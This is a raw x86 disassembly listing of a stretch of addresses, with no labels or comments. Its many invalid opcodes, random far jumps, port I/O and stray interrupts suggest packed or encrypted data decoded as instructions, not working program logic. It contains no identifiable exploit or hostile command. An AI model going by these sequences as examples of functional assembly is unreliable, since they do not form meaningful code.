  410e1b:	cmp    BYTE PTR [esi+0x4b88d59d],0xb0
  410e22:	push   0xc8feafd1
  410e27:	inc    ch
  410e29:	out    dx,eax
  410e2a:	rcl    esi,1
  410e2c:	lds    esi,FWORD PTR [esi+0x4]
  410e2f:	aad    0xcb
  410e31:	xchg   ax,ax
  410e33:	fidivr WORD PTR [edi]
  410e35:	or     al,dl
  410e37:	ins    BYTE PTR es:[edi],dx
  410e38:	in     al,dx
  410e39:	(bad)  
  410e3a:	xor    ebp,DWORD PTR [edi+ebx*4+0x6c790f79]
  410e41:	jmp    0x9d4cc599
  410e46:	jmp    0xc726:0xe53c0444
  410e4d:	rol    cl,1
  410e4f:	pop    ebx
  410e50:	and    DWORD PTR [ecx-0x72],ebx
  410e53:	ror    ecx,1
  410e55:	cwde   
  410e56:	js     0x410e5b
  410e58:	test   al,0xb1
  410e5a:	out    dx,al
  410e5b:	jae    0x410e75
  410e5d:	mov    cl,BYTE PTR [ebx-0x191c8478]
  410e63:	add    eax,0xb17b04f3
  410e68:	outs   dx,DWORD PTR ds:[esi]
  410e69:	mov    cl,0x9f
  410e6b:	push   cs
  410e6c:	cmp    ecx,DWORD PTR [esi+0x30b09bc6]
  410e72:	pop    ebp
  410e73:	es jmp 0x45ae7f6e
  410e79:	adc    al,0x43
  410e7b:	fstp   QWORD PTR ds:0x1e3b608f
  410e81:	xchg   esp,eax
  410e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e83:	test   al,0x1a
  410e85:	les    ecx,FWORD PTR [esi+ebp*4]
  410e88:	imul   ebx
  410e8a:	cli    
  410e8b:	and    edi,DWORD PTR [esi-0x22]
  410e8e:	sti    
  410e8f:	lods   eax,DWORD PTR ds:[esi]
  410e90:	adc    al,0x1a
  410e92:	adc    al,0x16
  410e94:	push   es
  410e95:	ds xchg edx,eax
  410e97:	pop    esi
  410e98:	pop    ebp
  410e99:	push   ebp
  410e9a:	sub    al,0x86
  410e9c:	add    eax,0x13c8fb2f
  410ea1:	std    
  410ea2:	push   esi
  410ea3:	cmp    al,0x97
  410ea5:	imul   ecx,DWORD PTR [ebx+0x19ee9a06],0x18419161
  410eaf:	outs   dx,BYTE PTR ds:[esi]
  410eb0:	and    al,0x99
  410eb2:	ins    DWORD PTR es:[di],dx
  410eb4:	fld    QWORD PTR [ebx-0x1d9fa038]
  410eba:	dec    ebx
  410ebb:	ret    
  410ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ebd:	xchg   esi,eax
  410ebe:	outs   dx,BYTE PTR ds:[esi]
  410ebf:	or     DWORD PTR [edx-0x2d],ebx
  410ec2:	iret   
  410ec3:	mov    cl,0x91
  410ec5:	(bad)  
  410ec7:	pushf  
  410ec8:	cmp    eax,0x3df5a92f
  410ecd:	test   DWORD PTR [eax-0x2fae330a],ebx
  410ed3:	lods   eax,DWORD PTR ds:[esi]
  410ed4:	dec    edx
  410ed5:	sbb    DWORD PTR [edi],ecx
  410ed7:	mov    ds:0xab7e5f2b,al
  410edc:	jae    0x410eb0
  410ede:	or     bl,BYTE PTR [edx]
  410ee0:	sub    eax,0xff3eef3e
  410ee5:	mov    WORD PTR [ebx],?
  410ee7:	loope  0x410e9e
  410ee9:	mov    dl,0x0
  410eeb:	sar    dl,1
  410eed:	jle    0x410eef
  410eef:	stos   BYTE PTR es:[edi],al
  410ef0:	mov    al,0x71
  410ef2:	pop    ebp
  410ef3:	adc    al,0xb1
  410ef5:	rol    DWORD PTR [ecx+0x370375cf],1
  410efb:	addr16 cdq 
  410efd:	popf   
  410efe:	pop    ds
  410eff:	leave  
  410f00:	jmp    0x410f76
  410f02:	push   cs
  410f03:	adc    ecx,DWORD PTR [esi-0x60]
  410f06:	or     ebp,DWORD PTR ds:0xa7509bcb
  410f0c:	shr    BYTE PTR [ebp+edi*4-0x4f],1
  410f10:	lea    ebx,[edx+ebp*4+0x12]
  410f14:	popf   
  410f15:	push   edi
  410f16:	sbb    ch,ah
  410f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f19:	add    eax,0x28f43ac4
  410f1e:	scas   al,BYTE PTR es:[edi]
  410f1f:	aam    0x4
  410f21:	jne    0x410f4c
  410f23:	and    DWORD PTR [eax+0x38857bdc],ecx
  410f29:	jnp    0x410efe
  410f2b:	scas   al,BYTE PTR es:[edi]
  410f2c:	push   0xffffffc4
  410f2e:	fsubr  DWORD PTR [esi+0x1d]
  410f31:	aas    
  410f32:	cmp    esi,DWORD PTR [ecx+eiz*8-0x4bf09218]
  410f39:	jmp    0x410ed0
  410f3b:	jle    0x410f23
  410f3d:	out    dx,al
  410f3e:	stc    
  410f3f:	mov    esi,0x38488ce2
  410f44:	mov    ah,BYTE PTR [eax-0x78b28a2a]
  410f4a:	pop    DWORD PTR [edi-0x57]
  410f4d:	add    ebp,DWORD PTR [ebp-0x17]
  410f50:	inc    esp
  410f51:	pop    esp
  410f52:	pop    es
  410f53:	push   edx
  410f54:	rcl    BYTE PTR [edx-0x7e],0x3e
  410f58:	pop    ds
  410f59:	(bad)  
  410f5a:	call   0x9063f72d
  410f5f:	pop    esi
  410f60:	and    ecx,DWORD PTR [edi+0x72]
  410f63:	xor    eax,0x8cae13c
  410f68:	sub    BYTE PTR [edi+0x102f838a],0x89
  410f6f:	xchg   ebp,eax
  410f70:	shr    BYTE PTR [esi],0x7d
  410f73:	xchg   edi,eax
  410f74:	imul   ecx,DWORD PTR [ebx+0x2a5ccf05],0x973fcdef
  410f7e:	cld    
  410f7f:	imul   edi,DWORD PTR [ebx-0x52695c95],0x863fbfbf
  410f89:	popf   
  410f8a:	xchg   DWORD PTR [edi+0x3a],esp
  410f8d:	int    0xf9
  410f8f:	inc    ebp
  410f90:	cdq    
  410f91:	test   esi,ebp
  410f93:	sbb    eax,DWORD PTR [edi-0x22a4725c]
  410f99:	mov    ecx,0x3873822
  410f9e:	pop    es
  410f9f:	pop    esi
  410fa0:	mov    WORD PTR [esi],ss
  410fa2:	jnp    0x410f49
  410fa4:	repnz push ss
  410fa6:	xchg   edx,eax
  410fa7:	mov    gs,WORD PTR [edi-0x1474f3a]
  410fad:	push   ecx
  410fae:	xchg   ebx,eax
  410faf:	jb     0x410fdd
  410fb1:	jbe    0x410f51
  410fb3:	cmp    ebp,ebp
  410fb5:	push   eax
  410fb6:	sti    
  410fb7:	leave  
  410fb8:	cmp    ebx,esi
  410fba:	mov    dl,0xb7
  410fbc:	rcl    DWORD PTR [edx+0x5b5f62f2],cl
  410fc2:	sub    dh,ch
  410fc4:	lods   al,BYTE PTR ds:[esi]
  410fc5:	call   0x5d20bae2
  410fca:	imul   ecx,DWORD PTR [edi],0x44
  410fcd:	aas    
  410fce:	pop    es
  410fcf:	scas   eax,DWORD PTR es:[edi]
  410fd0:	inc    ecx
  410fd1:	ror    BYTE PTR [ebx],cl
  410fd3:	xchg   esp,eax
  410fd4:	xchg   esi,eax
  410fd5:	jl     0x411033
  410fd7:	pop    ebp
  410fd8:	xchg   BYTE PTR [ebp-0x55],cl
  410fdb:	cwde   
  410fdc:	and    DWORD PTR [ecx-0x6c9bf7c2],edi
  410fe2:	dec    esp
  410fe3:	pop    esi
  410fe4:	mov    ds:0x441a54ae,al
  410fe9:	adc    DWORD PTR [ecx],0xffffffb9
  410fec:	pop    edx
  410fed:	jge    0x411026
  410fef:	inc    esi
  410ff0:	or     ch,0x38
  410ff3:	mov    ah,0x72
  410ff5:	clc    
  410ff6:	cli    
  410ff7:	shl    BYTE PTR [ebx],cl
  410ff9:	push   esp
  410ffa:	xor    edi,ebp
  410ffc:	jo     0x411012
  410ffe:	sub    DWORD PTR [ecx-0x2f],0x36
  411002:	dec    edi
  411003:	jle    0x41101b
  411005:	xlat   BYTE PTR ds:[ebx]
  411006:	or     BYTE PTR [esi],dl
  411008:	xor    eax,0xbb1eec07
  41100d:	in     al,dx
  41100e:	pusha  
  41100f:	ins    DWORD PTR es:[edi],dx
  411010:	mov    esp,0x65f076df
  411015:	cmp    BYTE PTR [ecx],al
  411017:	sti    
  411018:	call   0x678:0xc5ffb903
  41101f:	inc    ebp
  411020:	dec    eax
  411021:	ins    DWORD PTR es:[edi],dx
  411022:	cmp    al,0xd
  411024:	sbb    BYTE PTR [ebx+0x11],ah
  411027:	or     ah,ch
  411029:	dec    edi
  41102a:	mov    dh,0x3b
  41102c:	xchg   ebx,eax
  41102d:	adc    ecx,DWORD PTR cs:[edi-0x57]
  411031:	xor    BYTE PTR [edx],bh
  411033:	inc    ecx
  411035:	cmp    al,0x2b
  411037:	repz xchg ebx,eax
  411039:	pushf  
  41103a:	push   edi
  41103b:	cmp    ebx,DWORD PTR [edi-0x45]
  41103e:	js     0x411099
  411040:	sbb    eax,ecx
  411042:	out    dx,eax
  411043:	xchg   ebp,eax
  411044:	clc    
  411045:	dec    esp
  411046:	mov    ch,0x48
  411048:	jecxz  0x4110aa
  41104a:	mov    eax,ds:0x50dbd3d7
  41104f:	jmp    0x411051
  411051:	fwait
  411052:	sti    
  411053:	daa    
  411054:	test   eax,0x3be13c3f
  411059:	(bad)  
  41105a:	xor    bh,BYTE PTR [eax]
  41105c:	(bad)  [eax+0x2d]
  41105f:	mov    DWORD PTR [eax+0x14fbd272],ecx
  411065:	mov    eax,0xc41d1ce4
  41106a:	int3   
  41106b:	stos   BYTE PTR es:[edi],al
  41106c:	add    bl,BYTE PTR [ebp+0x6bcfbc7e]
  411072:	retf   
  411073:	mov    esp,eax
  411075:	xchg   DWORD PTR ds:0x337af3d8,edi
  41107b:	out    dx,al
  41107c:	xchg   ebx,eax
  41107d:	mov    edi,0x28880aaf
  411082:	add    eax,0x3e10805
  411087:	ds jp  0x411038
  41108a:	pop    ss
  41108b:	in     eax,0xe7
  41108d:	add    edi,DWORD PTR [esi]
  41108f:	stos   DWORD PTR es:[edi],eax
  411090:	test   BYTE PTR [eax+0x66],ah
  411093:	mov    bh,0xa7
  411095:	xchg   esp,eax
  411096:	jg     0x4110a4
  411098:	in     eax,0xaf
  41109a:	adc    bh,BYTE PTR [edi]
  41109c:	gs push 0xd62b0d47
  4110a2:	xchg   esi,eax
  4110a3:	push   edx
  4110a4:	dec    ebp
  4110a5:	mov    dl,0xde
  4110a7:	jno    0x4110d6
  4110a9:	aam    0x7f
  4110ab:	xlat   BYTE PTR ds:[ebx]
  4110ac:	push   ds
  4110ad:	ret    0xbebc
  4110b0:	out    dx,al
  4110b1:	jle    0x4110e5
  4110b3:	ins    BYTE PTR es:[edi],dx
  4110b4:	pop    ss
  4110b5:	(bad)  
  4110b6:	data16 (bad) 
  4110b8:	lods   al,BYTE PTR ds:[esi]
  4110b9:	push   ecx
  4110ba:	xchg   esi,eax
  4110bb:	push   0xd7e26787
  4110c0:	inc    edi
  4110c1:	aas    
  4110c2:	ins    DWORD PTR es:[edi],dx
  4110c3:	repnz popf 
  4110c5:	adc    bl,BYTE PTR [esi]
  4110c7:	adc    edx,DWORD PTR [ebx-0x36f5e754]
  4110cd:	xchg   ecx,eax
  4110ce:	xor    eax,edx
  4110d0:	out    0xb2,eax
  4110d2:	leave  
  4110d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110d4:	not    DWORD PTR ds:0x650e594c
  4110da:	pop    es
  4110db:	or     esi,DWORD PTR [eax-0x79]
  4110de:	mov    ch,BYTE PTR [edi]
  4110e0:	(bad)  
  4110e1:	and    DWORD PTR [eax+eiz*2+0x5a],ebp
  4110e5:	cwde   
  4110e6:	mov    WORD PTR [ebx+0x7],es
  4110e9:	or     eax,0xbd2bbcce
  4110ee:	lahf   
  4110ef:	ins    DWORD PTR es:[edi],dx
  4110f0:	js     0x411077
  4110f2:	mov    cl,0x5a
  4110f4:	jmp    0x17b4b5f1
  4110f9:	loopne 0x4110ce
  4110fb:	iret   
  4110fc:	hlt    
  4110fd:	push   ecx
  4110fe:	xlat   BYTE PTR ds:[ebx]
  4110ff:	add    DWORD PTR [ecx],eax
  411101:	mov    dl,0x4d
  411103:	jno    0x4110fb
  411105:	cmc    
  411106:	push   cs
  411107:	xchg   edi,eax
  411108:	(bad)
  41110b:	lahf   
  41110c:	push   esp
  41110d:	pop    ebx
  41110e:	push   ebp
  41110f:	sub    eax,0xbaff06ff
  411114:	fwait
  411115:	cmp    dl,ch
  411117:	xor    BYTE PTR [eax-0x69],0x48
  41111b:	pop    esp
  41111c:	add    BYTE PTR ds:0x22890ae5,0xaa
  411123:	xor    eax,0x780d44d4
  411128:	popa   
  411129:	dec    ebx
  41112a:	bound  eax,QWORD PTR [ebx-0x3edd2a1b]
  411130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411131:	test   dl,ah
  411133:	enter  0x7684,0xc5
  411137:	enter  0xd4a3,0x16
  41113b:	cli    
  41113c:	cmp    BYTE PTR [eax],dh
  41113e:	push   ebp
  41113f:	cwde   
  411140:	fcomp  QWORD PTR [eax+ecx*1]
  411143:	scas   al,BYTE PTR es:[edi]
  411144:	daa    
  411145:	xchg   ebx,eax
  411146:	stos   DWORD PTR es:[edi],eax
  411147:	pusha  
  411148:	mov    bl,0x3
  41114a:	xchg   esp,eax
  41114b:	stos   DWORD PTR es:[edi],eax
  41114c:	fs je  0x411110
  41114f:	cmp    esi,DWORD PTR [edx+0x61]
  411152:	xchg   edi,eax
  411153:	adc    DWORD PTR [ecx+ebp*2+0x212ee5ad],edx
  41115a:	int3   
  41115b:	cmc    
  41115c:	mov    edi,0x55fe9e9b
  411161:	imul   dx,WORD PTR [ebx],0x644f
  411166:	xchg   esi,eax
  411167:	pop    edi
  411168:	sahf   
  411169:	daa    
  41116a:	jno    0x41119c
  41116c:	mov    DWORD PTR [eax+0x46],0xfc4d8b12
  411173:	jmp    0x41167e
  411178:	(bad)
  41117b:	retf   
  41117c:	cmp    eax,0x69c9c9c9
  411181:	sahf   
  411182:	repz push 0x6b796aaf
  411188:	hlt    
  411189:	jb     0x411203
  41118b:	js     0x4111f7
  41118d:	jl     0x411207
  41118f:	js     0x411131
  411191:	(bad)
  411194:	ret    0x512a
  411197:	cld    
  411198:	cld    
  411199:	xor    BYTE PTR [edi-0x7d9e12],cl
  41119f:	xor    bh,BYTE PTR [ebx]
  4111a1:	mov    DWORD PTR ds:0x8e40b431,esp
  4111a7:	cmp    esi,edi
  4111a9:	and    DWORD PTR [esi+0xf5e3baf],edi
  4111af:	or     al,0x32
  4111b1:	adc    ebp,esi
  4111b3:	loope  0x411198
  4111b5:	mov    ch,0x28
  4111b7:	shl    DWORD PTR [ebx],cl
  4111b9:	aas    
  4111ba:	and    DWORD PTR [ebp-0x5ae835c3],ebp
  4111c0:	xchg   edi,eax
  4111c1:	scas   eax,DWORD PTR es:[edi]
  4111c2:	(bad)  [eax-0xe]
  4111c5:	dec    eax
  4111c6:	pop    esi
  4111c7:	jp     0x41115e
  4111c9:	push   eax
  4111ca:	pop    ebx
  4111cb:	xchg   ebx,eax
  4111cc:	cmp    al,0x19
  4111ce:	(bad)  
  4111cf:	xchg   ecx,eax
  4111d0:	pop    ss
  4111d1:	in     al,0x58
  4111d3:	fs jmp 0x411193
  4111d6:	pop    edi
  4111d7:	in     al,0x70
  4111d9:	aas    
  4111da:	pop    ebx
  4111db:	pop    ecx
  4111dc:	popf   
  4111dd:	jge    0x4111f3
  4111df:	sub    BYTE PTR [edx+0x42a4247],cl
  4111e5:	jmp    0x8b1a:0x6a844e59
  4111ec:	(bad)  [ebp+0x27151d46]
  4111f2:	mov    edx,0x8f7cbc95
  4111f7:	push   cs
  4111f8:	call   ecx
  4111fa:	push   esp
  4111fb:	jns    0x411271
  4111fd:	mov    bl,0xf3
  4111ff:	(bad)  
  411201:	dec    edi
  411202:	lods   eax,DWORD PTR ds:[esi]
  411203:	dec    eax
  411204:	into   
  411205:	addr16 cmc 
  411207:	xor    edi,DWORD PTR [edx]
  411209:	imul   esp,ecx,0x56
  41120c:	inc    eax
  41120d:	add    BYTE PTR ds:0xe1b733a4,bh
  411213:	shr    ebp,0x5d
  411216:	mov    eax,0xe731d4b4
  41121c:	loop   0x411273
  41121e:	mov    fs,cx
  411221:	sbb    eax,0x740388e5
  411226:	or     al,0x44
  411228:	and    dl,BYTE PTR [eax]
  41122a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41122b:	shl    BYTE PTR [ebp-0x58],1
  41122e:	dec    esi
  41122f:	stos   DWORD PTR es:[edi],eax
  411230:	dec    edi
  411231:	aaa    
  411232:	repnz fdivp st(1),st
  411235:	int    0xb3
  411237:	inc    esi
  411238:	sub    al,cl
  41123a:	fcom   DWORD PTR [esi]
  41123c:	scas   eax,DWORD PTR es:[edi]
  41123d:	push   ebp
  41123e:	and    eax,0xb23515bc
  411243:	dec    eax
  411244:	std    
  411245:	or     DWORD PTR [eax+0x21],ecx
  411248:	sbb    BYTE PTR ds:0x356dc8eb,cl
  41124e:	rol    BYTE PTR [esi+0x44],cl
  411251:	gs daa 
  411253:	jno    0x4112a9
  411255:	daa    
  411256:	push   edx
  411257:	mov    ds:0xbb2f1205,eax
  41125c:	mov    eax,0x706d8021
  411262:	xchg   ebx,eax
  411263:	sbb    esp,DWORD PTR [ebx+0x4734d755]
  411269:	sub    dh,BYTE PTR [edx]
  41126b:	loopne 0x41128e
  41126d:	repnz or bl,BYTE PTR ds:0x2329bacf
  411274:	daa    
  411275:	push   esi
  411276:	push   ebx
  411277:	shl    BYTE PTR [esi-0x37],0xa5
  41127b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41127c:	cmp    ch,BYTE PTR [esi+edx*2]
  41127f:	mov    edi,DWORD PTR [eax-0x5bcbc41]
  411285:	jmp    0x411208
  411287:	mov    BYTE PTR [ebp+0x16],0x18
  41128b:	ret    0x69a2
  41128e:	cmp    BYTE PTR [edi-0x1],dl
  411291:	and    eax,0xa9c79f0b
  411296:	into   
  411297:	daa    
  411298:	cmp    al,0x27
  41129a:	test   BYTE PTR [edx-0x56ba3c81],ah
  4112a0:	pop    edi
  4112a1:	adc    ecx,DWORD PTR [ecx+0x5e]
  4112a4:	add    BYTE PTR [esi+0xc],bh
  4112a7:	jnp    0x411301
  4112a9:	mov    WORD PTR [esi+0x49],es
  4112ac:	sar    BYTE PTR [esi-0x79],cl
  4112af:	mov    ds:0x7b8e092a,eax
  4112b4:	outs   dx,BYTE PTR ds:[esi]
  4112b5:	adc    edi,eax
  4112b7:	mov    al,ds:0x7c02086e
  4112bc:	jb     0x411260
  4112be:	lea    esi,ds:0xb306f555
  4112c4:	sbb    edx,DWORD PTR [eax+0x7df515c7]
  4112ca:	js     0x41127a
  4112cc:	jmp    0x1722:0x55ef77b4
  4112d3:	ficom  WORD PTR [edi-0xf]
  4112d6:	cmp    al,0x6
  4112d8:	push   esp
  4112d9:	imul   esp,DWORD PTR [edx-0x497b8ef9],0x25
  4112e0:	push   ss
  4112e1:	add    edi,ecx
  4112e3:	push   esp
  4112e4:	mov    edx,0xb9baaa4b
  4112e9:	rol    edi,1
  4112eb:	cmp    dh,0x71
  4112ee:	inc    edx
  4112ef:	push   edi
  4112f0:	outs   dx,BYTE PTR ds:[esi]
  4112f1:	mov    ds:0xcce30d38,eax
  4112f6:	(bad)  
  4112f9:	les    ebx,FWORD PTR [edi-0x5d2e5e1b]
  4112ff:	leave  
  411300:	jg     0x4112ad
  411302:	mov    cl,0x7d
  411304:	xchg   BYTE PTR es:[ebx+0xb],bl
  411308:	push   edx
  411309:	ret    
  41130a:	neg    DWORD PTR [edx-0x3d]
  41130d:	cmp    al,0xda
  41130f:	cld    
  411310:	xor    ecx,DWORD PTR [ebx+0x22]
  411313:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411314:	push   eax
  411315:	inc    ebx
  411316:	sub    ah,dl
  411318:	inc    ecx
  411319:	mov    cs,WORD PTR [ecx+0x567c9b68]
  41131f:	xor    eax,0x57f1c07c
  411324:	jne    0x4112ec
  411326:	jmp    0xfa28cdb9
  41132b:	sub    ch,BYTE PTR [edx-0x106e0073]
  411331:	and    esi,DWORD PTR [ecx]
  411333:	ret    0xfd4d
  411336:	aad    0xb5
  411338:	xchg   edi,eax
  411339:	add    BYTE PTR ds:0x8dab903,al
  41133f:	dec    ebp
  411340:	popf   
  411341:	addr16 ja 0x41132d
  411344:	cmp    bh,BYTE PTR [eax]
  411346:	sar    BYTE PTR [ebp-0x52],0xed
  41134a:	in     eax,0x10
  41134c:	(bad)  
  41134d:	int    0x19
  41134f:	mov    eax,0x7b0d1d6f
  411355:	mov    eax,0x3d46c9ce
  41135a:	int    0xba
  41135c:	lods   al,BYTE PTR ds:[esi]
  41135d:	retf   0x3e98
  411360:	sbb    BYTE PTR [ebx],cl
  411362:	neg    BYTE PTR [eax+0xf29d8c7]
  411368:	fwait
  411369:	sbb    esp,DWORD PTR [edx-0xa]
  41136c:	retf   
  41136d:	or     ebp,DWORD PTR [eax+0x7c]
  411370:	add    al,0xe2
  411372:	xchg   ebp,esp
  411374:	xor    eax,0xb3e13a1
  411379:	retf   0x87ea
  41137c:	in     eax,dx
  41137d:	repnz ffree st(4)
  411380:	jmp    0xfac1:0x2df3a5
  411387:	xchg   esp,eax
  411388:	cmc    
  411389:	mov    cl,0xed
  41138b:	mov    cl,0x2f
  41138d:	and    BYTE PTR [eax-0x260e602a],dl
  411393:	inc    sp
  411395:	ficomp DWORD PTR [ebx-0x4c]
  411398:	shl    BYTE PTR [ebp+ecx*4+0x1ab74b1f],1
  41139f:	sbb    esp,DWORD PTR [ecx]
  4113a1:	xor    ecx,edx
  4113a3:	outs   dx,DWORD PTR ds:[esi]
  4113a4:	pop    esi
  4113a5:	jge    0x4113fe
  4113a7:	cdq    
  4113a8:	mov    ebx,0x772ca5b
  4113ad:	imul   esi,DWORD PTR [edx+0x133de1b],0x12
  4113b4:	pop    esi
  4113b5:	push   eax
  4113b6:	or     BYTE PTR [ecx-0x69],ch
  4113b9:	push   cs
  4113ba:	cwde   
  4113bb:	fs pop eax
  4113bd:	cmp    al,0x2a
  4113bf:	sti    
  4113c0:	xchg   ecx,eax
  4113c1:	int    0xc0
  4113c3:	daa    
  4113c4:	adc    DWORD PTR [ebx+0x3f],edx
  4113c7:	mov    bh,0x9d
  4113c9:	sbb    eax,0xc0667358
  4113ce:	jl     0x411445
  4113d0:	cmp    bh,BYTE PTR [edi-0x3b01c4d7]
  4113d6:	sub    ecx,esp
  4113d8:	(bad)  
  4113d9:	bound  esp,QWORD PTR [ecx]
  4113db:	add    al,BYTE PTR [eax+0x19cbf06e]
  4113e1:	ins    BYTE PTR es:[edi],dx
  4113e2:	int    0x4d
  4113e4:	out    0x43,al
  4113e6:	sbb    ebp,DWORD PTR [edx-0x21]
  4113e9:	js     0x411395
  4113eb:	add    DWORD PTR [edx],eax
  4113ed:	fldenv [ebx]
  4113ef:	xchg   esi,eax
  4113f0:	mov    dh,0x9d
  4113f2:	mov    eax,ds:0xa860b12f
  4113f7:	sub    esi,DWORD PTR [edx]
  4113f9:	xlat   BYTE PTR ds:[ebx]
  4113fa:	imul   ebp,DWORD PTR [ecx-0x29],0xfffffff7
  4113fe:	cmp    al,0x28
  411400:	mov    esp,0xbcc36173
  411405:	loope  0x411468
  411407:	in     eax,0x9d
  411409:	jle    0x41147c
  41140b:	push   ebx
  41140c:	pop    edi
  41140d:	loop   0x4113ae
  41140f:	(bad)  
  411410:	pop    ecx
  411411:	add    ebp,DWORD PTR ds:[ebx-0x4f]
  411415:	inc    ebp
  411416:	push   edx
  411417:	and    esp,DWORD PTR [ebx]
  411419:	jae    0x4113a2
  41141b:	mov    dh,0xbd
  41141d:	test   al,0xa8
  41141f:	aas    
  411420:	fwait
  411421:	xchg   ebx,eax
  411422:	sti    
  411423:	pop    ebp
  411424:	cdq    
  411425:	mov    edx,0xbced7d07
  41142a:	pushf  
  41142b:	sub    eax,DWORD PTR [ebp-0x2b]
  41142e:	out    0x28,al
  411430:	push   edx
  411431:	cmp    cl,BYTE PTR [edx-0xf]
  411434:	lods   eax,DWORD PTR ds:[esi]
  411435:	or     BYTE PTR [edi],dh
  411437:	push   ss
  411438:	stc    
  411439:	dec    edx
  41143a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41143b:	sbb    ch,dl
  41143d:	enter  0x1eab,0x12
  411441:	jle    0x41146d
  411443:	fisubr DWORD PTR [ebx-0x7b364339]
  411449:	jge    0x4114c1
  41144b:	fsubp  st(0),st
  41144d:	popf   
  41144e:	inc    esp
  41144f:	cdq    
  411450:	fnstsw WORD PTR [ebx+0xd]
  411453:	jns    0x411402
  411455:	in     eax,dx
  411456:	jl     0x4114a9
  411458:	scas   eax,DWORD PTR es:[edi]
  411459:	cmp    eax,0xc4ac4038
  41145e:	push   cs
  41145f:	sub    al,0xc4
  411461:	jl     0x41145d
  411463:	push   0x57
  411465:	pop    ax
  411467:	fwait
  411468:	mov    ebx,0x32530a76
  41146d:	jae    0x4114ab
  41146f:	add    BYTE PTR [ebp+0xa8b30ee],al
  411475:	js     0x411429
  411477:	jne    0x4114dd
  411479:	inc    edi
  41147a:	fwait
  41147b:	pop    ebp
  41147c:	push   0x2b85dfeb
  411481:	loope  0x41140b
  411483:	cli    
  411484:	sub    eax,0xbaa6ab6d
  411489:	aad    0xea
  41148b:	sub    DWORD PTR [eax-0x5ed44306],ebx
  411491:	ds sub al,0x1e
  411494:	inc    ebx
  411495:	pop    eax
  411496:	jmp    0x5060:0x617c933c
  41149d:	push   0x4d
  41149f:	dec    edx
  4114a0:	rcr    DWORD PTR [ebx-0x9],cl
  4114a3:	mov    eax,ds:0xce62e7cb
  4114a8:	mov    edx,0xade95da6
  4114ad:	sub    DWORD PTR [ebx],edx
  4114af:	mov    eax,0x5597bb4c
  4114b4:	arpl   WORD PTR [esi],ax
  4114b6:	mov    ebx,0x983b89cf
  4114bb:	fstp   TBYTE PTR [esi+0x7b]
  4114be:	xor    dh,dl
  4114c0:	shl    DWORD PTR [eax],1
  4114c2:	mov    cl,BYTE PTR [ecx+0x3a]
  4114c5:	mov    eax,ds:0x33d477ea
  4114ca:	adc    esp,DWORD PTR [edi]
  4114cc:	imul   ebx,esp,0xcd9a804e
  4114d2:	loopne 0x41152a
  4114d4:	mov    esp,0xfd897ab1
  4114d9:	rcr    DWORD PTR ds:0x2e4cb994,0x0
  4114e0:	push   es
  4114e1:	dec    esp
  4114e2:	cmp    eax,0x3831b5f5
  4114e7:	push   ss
  4114e8:	addr16 clc 
  4114ea:	repnz push ebx
  4114ec:	fcmovne st,st(0)
  4114ee:	xchg   esi,eax
  4114ef:	mov    ds:0xea2b9c59,eax
  4114f4:	fldenv [esi+edx*8-0xd]
  4114f8:	gs (bad) 
  4114fa:	mov    edi,0xff2fef70
  4114ff:	mov    al,0xfd
  411501:	and    eax,0x96a99be7
  411506:	add    BYTE PTR [edx-0x513207b5],dh
  41150c:	stos   DWORD PTR es:[edi],eax
  41150d:	add    BYTE PTR [esi],0xb1
  411510:	inc    eax
  411511:	cdq    
  411512:	sbb    bl,BYTE PTR [ecx]
  411514:	popf   
  411515:	imul   DWORD PTR [esi+eax*1-0x599d0a88]
  41151c:	pop    edx
  41151d:	xlat   BYTE PTR ds:[ebx]
  41151e:	inc    ecx
  41151f:	dec    eax
  411520:	les    edi,FWORD PTR [edx+0x59]
  411523:	cmp    ax,WORD PTR [edx]
  411526:	ss cdq 
  411528:	fxch   st(6)
  41152a:	jmp    0x6d9e:0x4206ef2
  411531:	xchg   ecx,eax
  411532:	loope  0x41158c
  411534:	sti    
  411535:	mov    edi,DWORD PTR [bp+di]
  411538:	fucomip st,st(2)
  41153a:	dec    edx
  41153b:	xchg   esi,eax
  41153c:	cmc    
  41153d:	lahf   
  41153e:	push   ebp
  41153f:	pop    edi
  411540:	mov    ecx,esi
  411542:	out    dx,eax
  411543:	imul   ebp,eax,0xa8a8ee6d
  411549:	mov    eax,0x84a9e1da
  41154e:	mov    dh,0x78
  411550:	stos   DWORD PTR es:[edi],eax
  411551:	or     BYTE PTR [ebx+0x6f],ch
  411554:	shl    DWORD PTR [esi],cl
  411556:	retf   
  411557:	dec    esi
  411558:	xchg   ecx,eax
  411559:	out    dx,eax
  41155a:	lods   eax,DWORD PTR ds:[esi]
  41155b:	jg     0x41156f
  41155d:	aad    0x39
  41155f:	pusha  
  411560:	pop    eax
  411561:	mov    ebx,0x7967edca
  411566:	int    0xc1
  411568:	(bad)  
  411569:	xor    edx,DWORD PTR [ebx+0x2e1cae0f]
  41156f:	jge    0x411527
  411571:	and    DWORD PTR [edx],eax
  411573:	call   0xfc1d2ab0
  411578:	(bad)  
  411579:	jnp    0x411579
  41157b:	sub    edi,0xffffff92
  41157e:	sar    BYTE PTR ds:0xd50dc92c,1
  411584:	in     al,dx
  411585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411586:	data16 sbb dh,BYTE PTR [ebx-0xf]
  41158a:	ins    DWORD PTR es:[edi],dx
  41158b:	inc    edi
  41158c:	mov    bl,BYTE PTR [edx+ebx*1]
  41158f:	cmp    eax,0x92bf5598
  411594:	add    DWORD PTR [esi+eax*1+0x63a61955],esp
  41159b:	or     DWORD PTR [esi+0x710f6b5],0xffffff92
  4115a2:	xchg   bh,ah
  4115a4:	sub    eax,0x9495a034
  4115a9:	add    BYTE PTR [edx-0x72983bf7],dl
  4115af:	es pusha 
  4115b1:	mov    ebx,0xf2f41e62
  4115b6:	jnp    0x411553
  4115b8:	mov    es,esi
  4115ba:	jg     0x411602
  4115bc:	in     al,dx
  4115bd:	repnz inc edx
  4115bf:	cmp    al,BYTE PTR [ecx-0x1227c04a]
  4115c5:	fild   QWORD PTR [eax+0x61]
  4115c8:	dec    ebp
  4115c9:	adc    cl,dh
